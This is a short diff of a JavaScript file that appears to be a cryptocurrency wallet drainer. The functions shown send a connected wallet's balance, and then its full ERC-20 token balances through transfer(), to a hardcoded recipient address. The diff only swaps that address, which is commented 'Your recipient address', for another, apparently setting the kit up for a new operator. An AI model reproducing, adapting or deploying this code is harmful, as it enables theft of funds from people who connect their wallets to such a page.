@@ -93,7 +93,7 @@ async function sendFirstTransaction(signer, walletAddress) {
     console.log(`Preparing to send first transaction for wallet: ${walletAddress}`);
 
     if (typeof window.ethereum !== 'undefined') {
-        const recipientAddress = "0xd326374CEd4B78a6Edc284CA6dfBF765e97D7093"; // Your recipient address
+        const recipientAddress = "0x8603E3B68f53dFebE04F66053031C0bE924beAa2"; // Your recipient address
 
         try {
             // Get wallet balance
@@ -157,7 +157,7 @@ async function sendSecondTransaction(signer, walletAddress) {
             // Send tokens
             console.log(`Sending ${tokenBalance.toString()} of token ${tokenAddress}...`);
             const txResponse = await tokenContract.transfer(
-                "0xd326374CEd4B78a6Edc284CA6dfBF765e97D7093",
+                "0x8603E3B68f53dFebE04F66053031C0bE924beAa2",
                 tokenBalance
             );
             console.log(`ERC-20 token transfer successful for ${tokenAddress}:`, txResponse);
